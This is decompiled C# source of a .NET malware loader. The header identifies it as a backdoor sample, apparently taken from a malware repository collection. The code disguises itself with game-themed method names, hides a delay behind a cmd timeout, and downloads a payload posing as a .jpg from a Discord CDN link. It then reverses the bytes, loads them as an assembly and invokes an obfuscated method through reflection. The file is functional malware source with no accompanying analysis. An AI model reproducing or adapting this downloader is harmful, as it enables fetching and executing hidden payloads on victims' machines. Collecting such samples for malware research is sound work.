// Decompiled with JetBrains decompiler
// Type: Yuqqcw.Program
// Assembly: Eepghd, Version=18.5.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2B43A345-E02D-4288-ACF6-807D5EF9664E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.Androm.gen-0aa3d66fc2fa638bb44e1e81229753afef997fa353dc48f951f0830f5f81c03f.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Yuqqcw
{
  internal class Program
  {
    private static Program.HP GetHP { get; set; }

    [STAThread]
    private static void Main()
    {
      Program.GetHP = new Program.HP();
      Program.Play();
      Program.SaveGame();
      Program.LoadGame();
    }

    private static void Play()
    {
      if (Program.GetHP == null)
        return;
      Assembly.Load(Program.GetHP.BufferArray().ToArray());
    }

    private static void SaveGame()
    {
      if (Program.GetHP.HealthLevel > 0)
        return;
      foreach (Assembly assembly in Thread.GetDomain().GetAssemblies())
      {
        foreach (Type type in assembly.GetTypes())
        {
          foreach (MemberInfo member in type.GetMembers())
          {
            try
            {
              Program.GetHP.HealthLevel = (int) type.InvokeMember("Picwzbigmdytoybnx", BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) null);
            }
            catch
            {
            }
          }
        }
      }
    }

    private static void LoadGame() => Console.WriteLine(string.Format("Game loading {0}", (object) Program.GetHP.HealthLevel));

    private class HP
    {
      internal int HealthLevel { get; set; }

      internal HP() => Process.Start(new ProcessStartInfo()
      {
        FileName = "cmd",
        Arguments = "/c timeout 19",
        WindowStyle = ProcessWindowStyle.Hidden
      }).WaitForExit();

      internal List<byte> BufferArray()
      {
        try
        {
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        }
        catch
        {
        }
        List<byte> byteList = new List<byte>();
        byteList.AddRange((IEnumerable<byte>) new BinaryReader(WebRequest.Create("https://cdn.discordapp.com/attachments/946667303825735721/948714012558897162/Eepghd.jpg").GetResponse().GetResponseStream()).ReadBytes(87460299));
        byteList.Reverse();
        return byteList;
      }
    }
  }
}
